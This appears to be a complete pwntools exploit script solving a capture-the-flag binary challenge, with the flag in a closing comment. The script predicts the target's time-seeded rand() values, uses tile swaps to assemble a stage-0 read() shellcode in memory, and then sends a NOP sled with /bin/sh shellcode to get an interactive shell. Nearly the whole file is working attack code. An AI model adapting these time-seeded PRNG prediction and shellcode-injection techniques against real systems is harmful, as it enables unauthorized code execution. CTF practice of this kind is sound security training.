#!/usr/bin/env python3

from pwn import *
import re

exe = context.binary = ELF(args.EXE or '', checksec=True)
# libc = exe.libc
context.terminal = ["tmux", "splitw", "-h"]
# context.encoding = 'utf-8'

gdbscript = '''
b *play+177
continue
'''

pre_argv = []
post_argv = []

def get_conn(pre_argv=[], post_argv=[], gdbscript="", *a, **kw):
    host = args.HOST or ''
    port = int(args.PORT or 0)
    gdbscript = '\n'.join(line for line in gdbscript.splitlines() if line and not line.startswith('#'))
    exe_name = os.path.basename(exe.path)
    cmd = pre_argv + [exe.path] + post_argv

    if args.DOCKER:
        if args.REMOTE:
            p = remote(host, port, *a, **kw)
        else:
            p = process(f'docker run -i --rm {args.DOCKER}', shell=True)
        if args.GDB:
            sleep(1) # TODO: find better method
            gdb.attach(pidof(exe_name)[0], gdbscript=gdbscript, exe=exe.path, *a, **kw)
        return p
    if args.GDB:
        return gdb.debug(cmd, gdbscript=gdbscript, *a, **kw)
    if args.REMOTE:
        return remote(host, port, *a, **kw)

    return process(cmd, *a, **kw)

io = get_conn(pre_argv, post_argv, gdbscript)
r = lambda *a, **k: io.recv(*a, **k)
rl = lambda *a, **k: io.recvline(*a, **k)
ru = lambda *a, **k: io.recvuntil(*a, **k)
cl = lambda *a, **k: io.clean(*a, **k)
s = lambda *a, **k: io.send(*a, **k)
sa = lambda *a, **k: io.sendafter(*a, **k)
sl = lambda *a, **k: io.sendline(*a, **k)
sla = lambda *a, **k: io.sendlineafter(*a, **k)
ia = lambda *a, **k: io.interactive(*a, **k)
rotate_left = lambda x, a, s=64: (x << a) | (x >> (s-a))
rotate_right = lambda x, a, s=64: (x >> a) | (x << (s-a))
safe_link = lambda addr, ptr: (addr >> 12) ^ ptr
ptr_mangle = lambda addr, cookie=0: rotate_left(addr ^ cookie, 17)
ptr_demangle = lambda addr, cookie=0: rotate_right(addr, 17) ^ cookie
logleak = lambda **k: [success(f"{k}: {v:#x}") for k, v in k.items()]
has_space       = lambda data: any(c in {0x20, 0x09, 0x0a, 0x0b, 0x0c, 0x0d} for c in data)
is_scanf_safe   = lambda data: not has_space(data)
is_stream_safe  = lambda data: not has_space(data)
is_cin_safe     = lambda data: not has_space(data)
is_fgets_safe   = lambda data: (b'\n' not in data)
is_gets_safe    = lambda data: is_fgets_safe(data)
is_getline_safe = lambda data: is_fgets_safe(data)


def trace(func):
    def wrapper(*args, **kwargs):
        info(f"{func.__name__} {args} {kwargs}")
        return func(*args, **kwargs)
    return wrapper

def swap(i):
    sla(b'    > ', f'1\n{i}'.encode())

@trace
def swapn(i, n):
    p = b""
    for _ in range(n):
        p += f'1\n{i}\n'.encode()

    sla(b'    > ', p)

@trace
def play():
    sla(b'    > ', b'2')

HAND_SIZE = 14

# Desired stage0 bytes (example from earlier: 48 87 f7 31 ff 31 c0 0f 05 ff e6 90 90 90)
TARGET = bytes([
    0x48, 0x87, 0xF7, 0x31, 0xFF, 0x31, 0xC0,
    0x0F, 0x05, 0xFF, 0xE6, 0x90, 0x90, 0x90
])

# call read
TARGET = asm('''
xchg   rdi, rsi
xor    edi, edi 
mov rdx, r11
xor eax,eax
syscall
''')


assert len(TARGET) <= HAND_SIZE, "TARGET length must be smaller than or equal to HAND_SIZE"


import ctypes
import ctypes.util

libc_path = ctypes.util.find_library("/lib/x86_64-linux-gnu/libc.so.6")
libc = ctypes.CDLL(libc_path)

libc.time.argtypes = [ctypes.POINTER(ctypes.c_long)]
libc.time.restype = ctypes.c_long
libc.srand.argtypes = [ctypes.c_uint]
libc.rand.restype = ctypes.c_int

current_time = libc.time(None)

libc.srand(current_time)
vals = [libc.rand() & 0xff for _ in range(HAND_SIZE)]
info(f"PRNG values: {list(map(hex, vals))}")

ru(b'Your starting tiles:', drop=True)
rl()
rl()
hand = list(map(lambda v: int(v, 16), re.findall(rb'[\da-f]+', rl())))
info(f"Hand: {list(map(hex, hand))}")

assert hand == vals, "Hand does not match expected values from PRNG"


for i in range(len(TARGET)):
    swaps_needed = 0
    while hand[i] != TARGET[i]:
        swaps_needed += 1
        hand[i] = libc.rand() & 0xff
    else:
        info(f"Byte {i} is already correct: {hand[i]:#x}")

    if swaps_needed > 0:
        info(f"Byte {i} matched after {swaps_needed} swaps: {hand[i]:#x}")
        swapn(i, swaps_needed)
        ru(b'Tile swapped!', drop=True)


play()

s(b'\x90' * 30 + asm(shellcraft.sh())) 

ia()


# lactf{gg_y0u_sp3ll3d_sh3llc0d3}